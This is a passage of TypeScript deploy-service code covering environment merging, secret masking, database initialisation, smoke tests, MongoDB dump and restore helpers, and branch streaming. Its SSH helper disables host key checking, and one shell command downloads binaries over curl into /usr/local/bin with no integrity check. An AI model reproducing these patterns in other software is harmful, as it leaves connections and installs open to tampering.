  function cleanupPreviewServer(branchId: string) {
    const server = previewServers.get(branchId);
    if (server) {
      server.close();
      previewServers.delete(branchId);
      const entry = stateService.getBranch(branchId);
      if (entry) {
        delete entry.previewPort;
        stateService.save();
      }
      console.log(`[preview] Closed preview proxy for "${branchId}"`);
    }
  }

  // ── Helper: merged env (CDS_* auto vars + customEnv, later wins) ──
  //
  // When `projectId` is supplied, two extra project-scoped vars get
  // injected BEFORE customEnv so compose YAMLs can template against
  // them (e.g. `MongoDB__DatabaseName: "prdagent-${CDS_PROJECT_SLUG}"`
  // gives each project its own database without shared-mongo risks):
  //
  //   CDS_PROJECT_ID   — opaque project id (e.g. "50bf3eac3d02")
  //   CDS_PROJECT_SLUG — URL-friendly slug ("prd-agent-2"); for legacy
  //                      default project this is the repoRoot basename,
  //                      preserving existing behaviour.
  //
  // Branch-scoped env overrides project/global values for one preview branch.
  // Reserved project identity keys are still restored at the end.
  function getMergedEnv(projectId?: string, branchId?: string): Record<string, string> {
    const cdsEnv = stateService.getCdsEnvVars(projectId);   // CDS_HOST, CDS_MONGODB_PORT, etc.
    const mirrorEnv = stateService.getMirrorEnvVars(); // npm/corepack mirror (if enabled)
    // Scoped custom env: _global when no projectId, else { _global..., <projectId>... }
    const customEnv = stateService.getCustomEnv(projectId);
    const branchEnv = branchId ? stateService.getCustomEnvScope(branchId) : {};
    const projectEnv: Record<string, string> = {};
    if (projectId) {
      const project = stateService.getProject(projectId);
      if (project) {
        projectEnv.CDS_PROJECT_ID = project.id;
        projectEnv.CDS_PROJECT_SLUG = project.slug;
      }
    }
    // Bugbot PR #524 第十一轮:projectEnv(CDS_PROJECT_ID/SLUG)放在最后,
    // 与 buildBranchEnvMap 的 RESERVED_CDS_KEYS 保护语义一致 — 即便用户在
    // _global / project customEnv 写了 CDS_PROJECT_ID,部署阶段最终生效的也是
    // 系统派生真值。view 与 deploy 两端口因此输出完全一致,前端"显示安全"
    // 不再骗"实际危险"。原 customEnv 最后一条"operator can override"语义被
    // 修正为"operator can override 任何 key,**除了**项目身份这两个保留 key"。
    return { ...cdsEnv, ...mirrorEnv, ...customEnv, ...branchEnv, ...projectEnv };
  }

  /**
   * Mask sensitive env var values for response serialization. Delegates to the shared
   * SSOT maskEnvRecord (key-name OR URL-credential value), so URL-style secrets like
   * DATABASE_URL/MONGODB_URI/REDIS_URL are masked even though the key name isn't in the
   * sensitive list (Codex P2). All branch/profile serializers route through here.
   */
  function maskSecrets(env: Record<string, string>): Record<string, string> {
    return maskEnvRecord(env);
  }

  /**
   * 序列化分支时给 branch-local 额外服务(extraProfiles)的 env 打掩码（Codex P1「Redact extra
   * service env in responses」）。与 /build-profiles 的 maskSecrets 一致：状态层保持明文（deploy 路径
   * 从 state 直接读 raw env，不经序列化），仅响应视图脱敏，避免任何能查看分支的调用方拿到原始密钥。
   * GET→编辑→PUT 往返时回传的掩码哨兵由 mergeExtraEnv 还原成真实旧值，闭环不丢密钥。
   */
  function maskExtraProfilesEnv(profiles?: BuildProfile[]): BuildProfile[] | undefined {
    if (!profiles) return profiles;
    return profiles.map((p) => (p.env ? { ...p, env: maskSecrets(p.env) } : p));
  }
  /**
   * 返回分支的「视图安全」浅拷贝：extraProfiles 的 env + profileOverrides[<额外服务 id>] 的 env 脱敏，
   * 其余字段原样。委派到共享 SSOT maskBranchExtraProfilesEnv（与 state-stream 全量广播同一实现），
   * 后者同时遮蔽分支级额外服务的覆盖 env（Codex P1「Mask extra-profile override env in branch views」——
   * PUT /profile-overrides 现可给额外服务存 env 覆盖，/branches、/branches/:id、分支流原本只脱敏
   * extraProfiles、漏了 profileOverrides）。状态层保持明文供 deploy 直读。
   */
  function branchForView<T extends BranchEntry>(branch: T): T {
    return maskBranchExtraProfilesEnv(branch);
  }

  function isSqlInitInfra(service: InfraService): boolean {
    const kind = detectInfraDataKind(service.dockerImage);
    return kind === 'postgres' || kind === 'mysql';
  }

  function composeDatabaseInitCommand(detection: StackDetection, init: DatabaseInitRecommendation): string {
    const command = (init.command || '').trim();
    const install = (detection.installCommand || '').trim();
    if (!command || !install) return command;
    if (command.includes(install)) return command;
    return `${install} && ${command}`;
  }

  async function runDatabaseSqlInit(params: {
    entry: BranchEntry;
    init: DatabaseInitRecommendation;
    scanDir: string;
    projectId: string;
    logEvent: (ev: OperationLogEvent) => void;
  }): Promise<void> {
    const { entry, init, scanDir, projectId, logEvent } = params;
    const file = init.files.find((f) => f === 'schema.sql' || f === 'init.sql') || init.files[0];
    if (!file) throw new Error('未找到 SQL 初始化文件');
    const sqlPath = path.resolve(scanDir, file);
    const normalizedScanDir = path.resolve(scanDir);
    if (!sqlPath.startsWith(`${normalizedScanDir}${path.sep}`) && sqlPath !== normalizedScanDir) {
      throw new Error(`SQL 初始化文件路径非法: ${file}`);
    }
    const sql = fs.readFileSync(sqlPath, 'utf-8');
    const infra = stateService.getInfraServicesForProject(projectId)
      .filter((svc) => svc.status === 'running' && isSqlInitInfra(svc))
      .sort((a, b) => a.id.localeCompare(b.id))[0];
    if (!infra) {
      throw new Error('检测到 SQL 初始化脚本，但没有已运行的 PostgreSQL/MySQL/MariaDB 服务可执行。');
    }
    logEvent({
      step: `database-init-sql-${infra.id}`,
      status: 'running',
      title: `正在执行 ${file} 到 ${infra.name || infra.id}`,
      detail: { infraId: infra.id, file, branchId: entry.id },
      timestamp: new Date().toISOString(),
    });
    const plan = buildInfraDataExec(infra, 'init-sql', sql);
    const result = await runDockerExec(plan.argv, plan.stdin, 120_000);
    const output = maskSecretValues([result.stdout, result.stderr].filter(Boolean).join('\n'), plan.secretValues);
    if (result.code !== 0) {
      throw new Error(output || `${file} 执行失败，exit code ${result.code}`);
    }
    logEvent({
      step: `database-init-sql-${infra.id}`,
      status: 'done',
      title: `初始化完成：${file}`,
      log: output.trim() || undefined,
      detail: { infraId: infra.id, file, truncated: result.truncated },
      timestamp: new Date().toISOString(),
    });
  }

  async function runDatabaseInitializationForDeploy(params: {
    entry: BranchEntry;
    profiles: BuildProfile[];
    requestId?: string;
    operationId?: string;
    actor?: string;
    trigger?: string;
    assertCurrent?: (step: string) => void;
    logEvent: (ev: OperationLogEvent) => void;
  }): Promise<void> {
    const { entry, profiles, requestId, operationId, actor, trigger, assertCurrent, logEvent } = params;
    if (profiles.length === 0) return;
    const projectId = entry.projectId || 'default';
    const customEnv = getMergedEnv(projectId, entry.id);
    const firstEffective = resolveEffectiveProfile(profiles[0], entry);
    const scanTargets: Array<{ profile: BuildProfile; scanDir: string; label: string; root: boolean }> = profiles.map((profile) => {
      const effective = resolveEffectiveProfile(profile, entry);
      return {
        profile: effective,
        scanDir: path.resolve(entry.worktreePath, effective.workDir || '.'),
        label: effective.name || effective.id,
        root: false,
      };
    });
    const rootDir = path.resolve(entry.worktreePath);
    if (!scanTargets.some((target) => target.scanDir === rootDir)) {
      scanTargets.push({
        profile: { ...firstEffective, workDir: '.', containerWorkDir: firstEffective.containerWorkDir || '/app' },
        scanDir: rootDir,
        label: '仓库根目录',
        root: true,
      });
    }

    const seen = new Set<string>();
    let executed = 0;
    let skipped = 0;
    logEvent({
      step: 'database-init',
      status: 'running',
      title: '数据库准备中',
      detail: { scanTargets: scanTargets.map((target) => ({ label: target.label, root: target.root })) },
      timestamp: new Date().toISOString(),
    });

    for (const target of scanTargets) {
      assertCurrent?.(`database-init scan ${target.label}`);
      let detection: StackDetection;
      try {
        detection = detectStack(target.scanDir);
      } catch (err) {
        skipped += 1;
        logEvent({
          step: `database-init-scan-${target.label}`,
          status: 'warning',
          title: `${target.label} 初始化扫描失败`,
          log: (err as Error).message,
          timestamp: new Date().toISOString(),
        });
        continue;
      }
      const init = detection.databaseInit;
      if (!init) continue;
      const key = `${target.scanDir}:${init.kind}:${init.command || ''}:${init.files.join('|')}`;
      if (seen.has(key)) continue;
      seen.add(key);
      if (!init.autoExecutable) {
        skipped += 1;
        logEvent({
          step: `database-init-${init.kind}-${target.label}`,
          status: 'info',
          title: `检测到 ${init.label}，需要手动确认后执行`,
          log: init.summary,
          timestamp: new Date().toISOString(),
        });
        continue;
      }

      if (init.kind === 'sql') {
        try {
          await runDatabaseSqlInit({ entry, init, scanDir: target.scanDir, projectId, logEvent });
        } catch (err) {
          logEvent({
            step: `database-init-sql-${target.label}`,
            status: 'error',
            title: '初始化失败，查看日志',
            log: (err as Error).message,
            detail: { files: init.files, label: target.label },
            timestamp: new Date().toISOString(),
          });
          throw err;
        }
        executed += 1;
        continue;
      }

      const command = composeDatabaseInitCommand(detection, init);
      if (!command) {
        skipped += 1;
        continue;
      }
      const step = `database-init-${target.profile.id}-${init.kind}`;
      logEvent({
        step,
        status: 'running',
        title: `正在执行迁移：${init.label}`,
        log: command,
        detail: { profileId: target.profile.id, files: init.files, signals: init.signals },
        timestamp: new Date().toISOString(),
      });
      let result;
      try {
        result = await containerService.runProfileCommand(
          entry,
          target.profile,
          command,
          undefined,
          customEnv,
          { requestId, operationId, actor, trigger, assertCurrent, timeoutMs: target.profile.buildTimeout ?? 600_000 },
        );
      } catch (err) {
        logEvent({
          step,
          status: 'error',
          title: '初始化失败，查看日志',
          log: (err as Error).message,
          detail: { profileId: target.profile.id, files: init.files },
          timestamp: new Date().toISOString(),
        });
        throw err;
      }
      const output = maskSecretsText(combinedOutput(result), { mask: true });
      if (result.exitCode !== 0) {
        const message = output || `${init.label} 初始化失败，exit code ${result.exitCode}`;
        logEvent({
          step,
          status: 'error',
          title: '初始化失败，查看日志',
          log: message,
          detail: { profileId: target.profile.id, files: init.files },
          timestamp: new Date().toISOString(),
        });
        throw new Error(message);
      }
      logEvent({
        step,
        status: 'done',
        title: `初始化完成：${init.label}`,
        log: output.trim() || undefined,
        detail: { profileId: target.profile.id, files: init.files },
        timestamp: new Date().toISOString(),
      });
      executed += 1;
    }

    logEvent({
      step: 'database-init',
      status: 'done',
      title: executed > 0
        ? `数据库初始化完成：已执行 ${executed} 个任务`
        : skipped > 0
          ? '数据库初始化：已识别手动兜底项，未自动执行'
          : '数据库初始化：未发现需要执行的任务',
      detail: { executed, skipped },
      timestamp: new Date().toISOString(),
    });
  }

  // ── Helper: SSE setup ──
  function initSSE(res: import('express').Response) {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'close',
      'X-Accel-Buffering': 'no',
    });
  }

  function sendSSE(res: import('express').Response, event: string, data: unknown) {
    try {
      res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
    } catch { /* client disconnected */ }
  }

  /**
   * Phase 4: optionally run scripts/smoke-all.sh after a successful
   * deploy, piggy-backing SSE events on the deploy stream as
   * `smoke-start` / `smoke-line` / `smoke-complete`. Returns the
   * result so the caller can fold it into the GitHub check-run
   * conclusion (Phase 5).
   *
   * All failure paths emit exactly one `smoke-skip` line and resolve
   * with null so the deploy flow keeps going. This is intentionally
   * best-effort — smoke is diagnostic, not a gate.
   */
  async function maybeRunAutoSmoke(
    res: import('express').Response,
    entry: BranchEntry,
    deployFailed: boolean,
  ): Promise<SmokeRunResult | null> {
    if (deployFailed) return null;
    const project = stateService.getProject(entry.projectId || 'default');
    if (!project?.autoSmokeEnabled) return null;

    const emitSkip = (reason: string) => {
      try {
        res.write(`event: smoke-skip\ndata: ${JSON.stringify({ reason })}\n\n`);
      } catch { /* client gone */ }
    };

    const previewHost = config.previewDomain || config.rootDomains?.[0];
    if (!previewHost) {
      emitSkip('preview_host_missing');
      return null;
    }
    // 走 buildPreviewUrlForProject 全栈入口，项目预览身份由 preview-slug.ts 统一解析。
    const smokeHost = buildPreviewUrlForProject(previewHost, entry.branch, project, project.id).url;
    if (!smokeHost) {
      emitSkip('preview_host_missing');
      return null;
    }

    // 走 per-branch merged env：branch 覆盖 project/global。
    const mergedEnv = getMergedEnv(entry.projectId, entry.id);
    const accessKey = (mergedEnv?.AI_ACCESS_KEY || '').trim();
    if (!accessKey) {
      emitSkip('access_key_missing');
      return null;
    }

    const script = resolveSmokeScriptDir();
    if (!script.exists) {
      emitSkip('smoke_script_missing');
      return null;
    }

    sendSSE(res, 'smoke-start', { host: smokeHost, branchId: entry.id });

    return new Promise<SmokeRunResult | null>((resolve) => {
      runSmokeForBranch({
        branch: entry,
        previewHost: smokeHost,
        accessKey,
        scriptDir: script.dir,
        failFast: true, // CI-style — first failure stops the chain
        onLine: (channel, text) => sendSSE(res, 'smoke-line', { stream: channel, text }),
        onError: (err) => {
          sendSSE(res, 'smoke-line', { stream: 'stderr', text: `[auto-smoke] ${err.message}` });
          sendSSE(res, 'smoke-complete', { exitCode: -1, elapsedSec: 0, passedCount: 0, failedCount: 0, error: err.message });
          resolve(null);
        },
        onComplete: (result) => {
          sendSSE(res, 'smoke-complete', result);
          resolve(result);
        },
      });
    });
  }

  /**
   * Compute current container capacity status.
   * Returns `current / max` — when `current >= max` the host is considered
   * over-subscribed and the caller should warn (or, with scheduler enabled,
   * trigger LRU eviction before spawning new containers).
   *
   * Duplicates the logic in `GET /branches` so deploy-time decisions don't
   * depend on the client having fetched capacity first.
   * See doc/design.cds.resilience.md §四.1.
   */
  function computeCapacity(): { current: number; max: number; totalMemGB: number } {
    const totalMemGB = Math.round(os.totalmem() / (1024 * 1024 * 1024));
    const max = Math.max(2, (totalMemGB - 1) * 2);
    let current = 0;
    for (const b of stateService.getAllBranches()) {
      for (const svc of Object.values(b.services)) {
        if (svc.status === 'running' || svc.status === 'building' || svc.status === 'starting') {
          current++;
        }
      }
    }
    return { current, max, totalMemGB };
  }

  /** Write deploy event to stdout (captured by cds.log when running in background) */
  function logDeploy(branchId: string, message: string) {
    const ts = new Date().toISOString().slice(11, 19);
    console.log(`  [deploy:${branchId}] ${ts} ${message}`);
  }

  /** Download MongoDB database tools binary (platform-independent fallback) */
  async function installMongoToolsBinary(sh: IShellExecutor, send: (msg: string) => void) {
    const archResult = await sh.exec('uname -m');
    const arch = archResult.stdout.trim();
    const isArm = arch === 'aarch64' || arch === 'arm64';
    const platform = isArm ? 'arm64' : 'x86_64';
    const url = `https://fastdl.mongodb.org/tools/db/mongodb-database-tools-debian12-${platform}-100.10.0.deb`;
    send(`正在下载 MongoDB 工具 (${platform})...`);
    // Try dpkg if debian-based, otherwise extract manually
    const dlResult = await sh.exec(
      `cd /tmp && curl -fsSL -o mongo-tools.deb "${url}" 2>&1 && dpkg -x mongo-tools.deb /tmp/mongo-tools-extracted 2>&1 && cp /tmp/mongo-tools-extracted/usr/bin/mongo* /usr/local/bin/ 2>&1 && chmod +x /usr/local/bin/mongo* && rm -rf /tmp/mongo-tools.deb /tmp/mongo-tools-extracted`,
      { timeout: 120000 }
    );
    if (dlResult.exitCode !== 0) {
      // Try tarball as absolute fallback
      send('deb 安装失败，尝试 tarball...');
      const tgzUrl = `https://fastdl.mongodb.org/tools/db/mongodb-database-tools-linux-${platform}-100.10.0.tgz`;
      await sh.exec(
        `cd /tmp && curl -fsSL -o mongo-tools.tgz "${tgzUrl}" && tar xzf mongo-tools.tgz && cp mongodb-database-tools-*/bin/mongo* /usr/local/bin/ && chmod +x /usr/local/bin/mongo* && rm -rf /tmp/mongo-tools.tgz /tmp/mongodb-database-tools-*`,
        { timeout: 120000 }
      );
    }
    send('MongoDB 工具已安装');
  }

  // ─────────────────────────────────────────────────────────────────
  //   Migration pipeline helpers (shared by /execute, local-dump, local-restore)
  // ─────────────────────────────────────────────────────────────────

  /**
   * Build the mongodump argument list for a resolved connection.
   * Always uses `--archive --gzip` so the output is a single streamable blob.
   */
  function buildMongodumpArgs(
    host: string,
    port: number,
    auth: { username?: string; password?: string; authDatabase?: string },
    database: string | undefined,
    collections: string[] | undefined,
  ): string[] {
    const args: string[] = ['--host', host, '--port', String(port), '--archive', '--gzip'];
    if (auth.username) args.push('--username', auth.username);
    if (auth.password) args.push('--password', auth.password);
    if (auth.authDatabase) args.push('--authenticationDatabase', auth.authDatabase);
    if (database) args.push('--db', database);
    if (collections && collections.length === 1) {
      // mongodump only supports --collection when --db is set + single collection
      args.push('--collection', collections[0]);
    }
    // For multi-collection migrations, dump the whole db and let --nsInclude filter on restore
    return args;
  }

  function buildMongorestoreArgs(
    host: string,
    port: number,
    auth: { username?: string; password?: string; authDatabase?: string },
    opts: { drop: boolean; sourceDb?: string; targetDb?: string; collections?: string[] },
  ): string[] {
    const args: string[] = ['--host', host, '--port', String(port), '--archive', '--gzip'];
    if (auth.username) args.push('--username', auth.username);
    if (auth.password) args.push('--password', auth.password);
    if (auth.authDatabase) args.push('--authenticationDatabase', auth.authDatabase);
    if (opts.drop) args.push('--drop');
    // Cross-database rename: --nsFrom="srcDb.*" --nsTo="tgtDb.*"
    if (opts.sourceDb && opts.targetDb && opts.sourceDb !== opts.targetDb) {
      args.push('--nsFrom', `${opts.sourceDb}.*`, '--nsTo', `${opts.targetDb}.*`);
    }
    if (opts.sourceDb && opts.collections && opts.collections.length > 0) {
      // Filter to only these collections
      for (const col of opts.collections) {
        args.push('--nsInclude', `${opts.sourceDb}.${col}`);
      }
    }
    return args;
  }

  /**
   * Parse a line of mongodump/mongorestore progress output and return a
   * human-readable one-liner, or null if the line carries no useful signal.
   *
   * Example inputs:
   *   "2026-04-10T23:41:12.419+0200 [####........] prdagent.users 500/4105 (12.2%)"
   *   "2026-04-10T23:41:10.660+0200 writing prdagent.users to /dev/stdout"
   *   "2026-04-10T23:41:30.660+0200 done dumping prdagent.users (4105 documents)"
   */
  function parseMongoProgressLine(line: string): string | null {
    const trimmed = line.trim();
    if (!trimmed) return null;
    // Progress bar line: "[####....] db.col 500/4105 (12.2%)"
    const bar = trimmed.match(/\]\s+([^\s]+)\s+(\d+)\/(\d+)\s+\(([\d.]+)%\)/);
    if (bar) return `${bar[1]} ${bar[4]}%  (${bar[2]}/${bar[3]})`;
    // "writing db.col to ..."
    const writing = trimmed.match(/writing\s+([^\s]+)\s+to/);
    if (writing) return `写入 ${writing[1]}...`;
    // "done dumping db.col (N documents)"
    const doneDump = trimmed.match(/done dumping\s+([^\s]+)\s+\((\d+)\s+documents?\)/);
    if (doneDump) return `OK 导出 ${doneDump[1]} (${doneDump[2]})`;
    // "finished restoring db.col (N documents, 0 failures)"
    const doneRestore = trimmed.match(/finished restoring\s+([^\s]+)\s+\((\d+)\s+documents?/);
    if (doneRestore) return `OK 导入 ${doneRestore[1]} (${doneRestore[2]})`;
    // "preparing collections to restore from"
    if (trimmed.includes('preparing collections')) return '准备还原集合...';
    // Error-ish lines
    if (/error|failed|fatal/i.test(trimmed)) return trimmed.slice(0, 200);
    return null;
  }

  /**
   * Build the SSH command prefix used to run mongodump/mongorestore on a
   * remote jump host. The resulting array starts with 'ssh' and ends with
   * the username@host argument, ready to be appended with the remote shell
   * command as the last argv item.
   */
  function buildSshBase(tunnel: NonNullable<MongoConnectionConfig['sshTunnel']>): string[] {
    const args = [
      '-o', 'BatchMode=yes',
      '-o', 'StrictHostKeyChecking=no',
      '-o', 'UserKnownHostsFile=/dev/null',
      '-o', 'ConnectTimeout=10',
      // Keepalive: critical for long dumps — send a probe every 30s, tolerate 10 misses.
      '-o', 'ServerAliveInterval=30',
      '-o', 'ServerAliveCountMax=10',
      '-o', 'TCPKeepAlive=yes',
      '-p', String(tunnel.port || 22),
    ];
    if (tunnel.privateKeyPath) args.unshift('-i', tunnel.privateKeyPath);
    args.push(`${tunnel.username}@${tunnel.host}`);
    return args;
  }

  /**
   * Shell-quote a single argument (single-quote style, safe for POSIX sh).
   */
  function shq(s: string): string {
    return `'${String(s).replace(/'/g, `'"'"'`)}'`;
  }

  /**
   * Build the remote command string for mongodump/mongorestore over SSH,
   * optionally wrapped in `docker exec <container> sh -c ...`.
   */
  function buildRemoteMongoCmd(
    tool: 'mongodump' | 'mongorestore',
    args: string[],
    dockerContainer: string | undefined,
  ): string {
    const inner = [tool, ...args.map(shq)].join(' ');
    if (dockerContainer) {
      // docker exec -i for restore (stdin), no -i for dump
      const flags = tool === 'mongorestore' ? '-i' : '';
      return `docker exec ${flags} ${shq(dockerContainer)} sh -c ${shq(inner)}`.replace(/  +/g, ' ');
    }
    return inner;
  }

  // ── Remote branches ──
  //
  // Behavior (2026-04-30, 防"加载分支与远程引用"卡 30s):
  //   - `git fetch origin --prune` 每个 repoRoot 独立 cache 5 分钟
  //   - 5 分钟内只跑 `for-each-ref`(纯本地读 refs,毫秒级)
  //   - `?nofetch=true` 强制跳过 fetch,纯本地读(用户主动刷新前置场景)
  //   - 响应额外字段 `cachedAt`、`fetched` 让前端能展示"上次同步于 N 分钟前"

  const REMOTE_FETCH_CACHE_MS = 5 * 60 * 1000;
  const remoteFetchCache = new Map<string, number>(); // repoRoot → lastFetchedAt

  router.get('/remote-branches', async (req, res) => {
    try {
      const projectId = resolveProjectIdParam(req.query.project);
      const noFetch = req.query.nofetch === 'true' || req.query.nofetch === '1';
      const repoRoot = projectId
        ? stateService.getProjectRepoRoot(projectId, config.repoRoot)
        : config.repoRoot;
      const project = projectId ? stateService.getProject(projectId) : null;

      const now = Date.now();
      const lastFetchedAt = remoteFetchCache.get(repoRoot) || 0;
      const cacheValid = now - lastFetchedAt < REMOTE_FETCH_CACHE_MS;

      let fetched = false;
      if (!noFetch && !cacheValid) {
        const auth = await gitAuthForRepo(repoRoot);
        const fetchResult = await shell.exec(
          'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
          { cwd: repoRoot, timeout: 30_000, env: auth.env },
        );
        if (fetchResult.exitCode !== 0) {
          const output = combinedOutput(fetchResult).slice(0, 500);
          res.status(502).json({
            error: 'git_fetch_failed',
            message: output || 'git fetch origin --prune 失败',
            authSource: auth.source,
            projectId: auth.projectId,
          });
          return;
        }
        remoteFetchCache.set(repoRoot, now);
        fetched = true;
      }

      const SEP = '<SEP>';
      const format = [
        '%(refname:lstrip=3)', '%(committerdate:iso8601)',
        '%(authorname)', '%(subject)',
      ].join(SEP);

      const result = await shell.exec(
        `git for-each-ref --sort=-committerdate --format="${format}" refs/remotes/origin`,
        { cwd: repoRoot },
      );

      let defaultBranch: string | null = null;
      const headResult = await shell.exec(
        'git symbolic-ref --short refs/remotes/origin/HEAD',
        { cwd: repoRoot, timeout: 5_000 },
      );
      if (headResult.exitCode === 0) {
        defaultBranch = headResult.stdout.trim().replace(/^origin\//, '') || null;
      }
      if (project && defaultBranch && project.gitDefaultBranch !== defaultBranch) {
        stateService.updateProject(project.id, { gitDefaultBranch: defaultBranch });
      }

      const branches = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => {
          const [name, date, author, subject] = line.split(SEP);
          return { name, date, author, subject, isDefault: defaultBranch ? name === defaultBranch : false };
        })
        .filter(b => b.name !== 'HEAD');

      res.json({
        branches,
        defaultBranch,
        fetched,
        cachedAt: cacheValid ? lastFetchedAt : (fetched ? now : null),
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Branches CRUD ──

  // Live UI stream — 2026-04-19.
  //
  // Dashboards subscribe to this SSE once on page load. We emit:
  //   - event: snapshot         (initial/reconnect hint; GET /branches is list authority)
  //   - event: branch.created   (GitHub webhook or manual add)
  //   - event: branch.updated   (commit SHA refresh, favorite/tag/notes change)
  //   - event: branch.status    (idle → building → running/error)
  //   - event: branch.removed   (delete from any path)
  //   - event: branch.deploy-step (per step of ongoing deploy)
  //   - :keepalive every 10s    (prevents proxy idle timeout)
  //
  // No auth differentiation — the dashboard was already authenticated to
  // get HERE; the stream just mirrors the same data a GET /branches would
  // return. Optional ?project= filters events to a single project so a
  // Dashboard opened on one project doesn't animate for another project's
  // push (prevents cross-project noise).
  //
  // server-authority rule: client disconnect does NOT cancel any backend
  // work; only the listener handle is detached.
  router.get('/branches/stream', (req, res) => {
    const projectFilter = resolveProjectIdParam(req.query.project);

    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'close',
      'X-Accel-Buffering': 'no',
    });

    let streamEventSeq = 0;
    const safeSend = (event: string, data: unknown) => {
      const dataObject = data && typeof data === 'object' && !Array.isArray(data)
        ? data as Record<string, unknown>
        : { value: data };
      const payload = { ...dataObject, eventId: `${Date.now()}-${++streamEventSeq}` };
      try { res.write(`event: ${event}\ndata: ${JSON.stringify(payload)}\n\n`); }
      catch { /* client gone */ }
    };

    // Helper: filter events that belong to a different project. Project
    // scoped clients must only receive events with explicit projectId or
    // branch.projectId. Legacy/global events without project identity are
    // ignored so a malformed event cannot blank or mutate another project.
    const eventMatchesFilter = (type: string, payload: any): boolean => {
      if (!projectFilter) return true;
      if (payload?.branch?.projectId) return payload.branch.projectId === projectFilter;
      if (payload?.projectId) return payload.projectId === projectFilter;
      return false;
    };

    // Initial snapshot — retained for stream liveness and reconnect
    // hints. Dashboard list authority is GET /api/branches?project=...
    // so clients must not treat this event as permission to replace the
    // full branch list.
    const all = stateService.getAllBranches();
    const snapshot = projectFilter
      ? all.filter((b) => (b.projectId || 'default') === projectFilter)
      : all;
    for (const branch of snapshot) reconcileBranchStatus(branch);
    safeSend('snapshot', { branches: snapshot.map(branchForView), projectId: projectFilter || undefined, ts: nowIso() });

    // Subscribe to the 'any' channel so we get one envelope per emit
    // with {type, payload} and can route with a single listener.
    const exposeBranchForStream = (branch: any): any => {
      const withSha = branch?.githubCommitSha && !branch.commitSha
        ? { ...branch, commitSha: branch.githubCommitSha }
        : branch;
      // 流式 branch.status / branch.updated 事件同样要给 extraProfiles env 脱敏（Bugbot Medium
      // 「SSE leaks extra service secrets」）：此前只有初始 snapshot 走了 branchForView，后续事件
      // 直接从 state 取原始 branch，订阅者会收到额外服务明文密钥。这里统一过 branchForView。
      return branchForView(withSha);
    };
    const anyHandler = (envelope: any) => {
      if (!envelope || !envelope.type) return;
      if (!eventMatchesFilter(envelope.type, envelope.payload)) return;
      if (envelope.payload?.branch) {
        safeSend(envelope.type, {
          ...envelope.payload,
          branch: exposeBranchForStream(envelope.payload.branch),
        });
        return;
      }
      if (envelope.type === 'branch.updated' && envelope.payload?.branchId) {
        const branch = stateService.getBranch(envelope.payload.branchId);
        safeSend(envelope.type, branch ? { ...envelope.payload, branch: exposeBranchForStream(branch) } : envelope.payload);
        return;
      }
      if (envelope.type === 'branch.status' && envelope.payload?.branchId) {
        const branch = stateService.getBranch(envelope.payload.branchId);
        safeSend(envelope.type, branch ? { ...envelope.payload, branch: exposeBranchForStream(branch) } : envelope.payload);
        return;
      }
      safeSend(envelope.type, envelope.payload);
    };
    branchEvents.on('any', anyHandler);

    const keepalive = setInterval(() => {
      try { res.write(':keepalive\n\n'); } catch { /* noop */ }
    }, 10_000);

    // Detach on client close — does NOT cancel any backend work.
    req.on('close', () => {
      clearInterval(keepalive);
      branchEvents.off('any', anyHandler);
    });
  });

  // ── /api/branches 列表：短 TTL 缓存 + 并发去重（2026-06-22 性能）──
  // 单线程下该 handler 单请求 ~500ms（48 分支 enrich + 资源聚合 + 全量序列化），
  // 10 个并发各算一遍 → 串行排队 5s+，正是用户反馈"服务器效率太低、扛不住并发"的根因。
  //   1) 短 TTL（默认 1s）payload 缓存：窗口内重复请求直接复用，不再重算/重序列化
  //   2) in-flight 去重：同 key 并发未命中只算一次，其余 await 同一个 Promise（10 并发→1 次计算）
  // live=true（显式 docker 对账 + 写状态）永远绕过，保持权威性。
  // 缓存的是 payload 对象（非序列化串），每个请求仍各自 res.json → server.ts 的
  // widget 跨项目过滤 wrapper 照常逐请求生效（它 {...body} 不改原对象，并发安全）。
  const BRANCHES_CACHE_TTL_MS = Math.max(0, Number(process.env.CDS_BRANCHES_CACHE_TTL_MS ?? 1000));
  interface BranchesListResult { payload: unknown; serialized: string; timings: Record<string, number>; }
  const branchesListCache = new Map<string, { at: number; result: BranchesListResult }>();
  const branchesListInflight = new Map<string, Promise<BranchesListResult>>();

  async function computeBranchesListPayload(
    opts: { projectFilter: string | null; live: boolean; requestId?: string },
  ): Promise<BranchesListResult> {
    const { projectFilter, live, requestId } = opts;
    const startedAt = Date.now();
    const timings: Record<string, number> = {};
    let lastTimingAt = startedAt;
    const markTiming = (name: string): void => {
      const now = Date.now();
      timings[name] = now - lastTimingAt;
      lastTimingAt = now;
    };
    const state = stateService.getState();
    markTiming('getState');
    // Default is an authoritative state snapshot. Docker/git probing is an
    // explicit operator action (`?live=true`) so passive page loads, polling,
    // widgets, and preview pages cannot silently turn reads into expensive
    // reconciliation work.
    const branches = Object.values(state.branches).filter(
      (b) => !projectFilter || (b.projectId || 'default') === projectFilter,
    );
    markTiming('filterBranches');
    const aiActivityByBranch = new Map<string, { count: number; lastAt: string }>();
    const projectIds = new Set(branches.map((b) => b.projectId || 'default'));
    const branchIdSet = new Set(branches.map((b) => b.id));
    const branchNameToIds = new Map<string, string[]>();
    for (const b of branches) {
      const ids = branchNameToIds.get(b.branch) || [];
      ids.push(b.id);
      branchNameToIds.set(b.branch, ids);
    }
    let activityLogCount = 0;
    for (const projectId of projectIds) {
      const logs = stateService.getActivityLogs(projectId);
      activityLogCount += logs.length;
      for (const log of logs) {
        if (!isAiActivityLog(log)) continue;
        const ids = log.branchId && branchIdSet.has(log.branchId)
          ? [log.branchId]
          : log.branchName
            ? (branchNameToIds.get(log.branchName) || [])
            : [];
        for (const id of ids) {
          const current = aiActivityByBranch.get(id);
          aiActivityByBranch.set(id, {
            count: (current?.count || 0) + 1,
            lastAt: current?.lastAt && current.lastAt > log.at ? current.lastAt : log.at,
          });
        }
      }
    }
    markTiming('activityLogs');

    // Explicit live reconcile only (perf fix, 2026-05-03):
    // Old code did `containerService.isRunning(svc.containerName)` sequentially
    // for every (branch × service) tuple — N×M `docker inspect` calls,
    // ~50–150 ms each. With ~20 branches × 5 services that is 5+ seconds of
    // wall-clock latency on every page load, which is what users were seeing
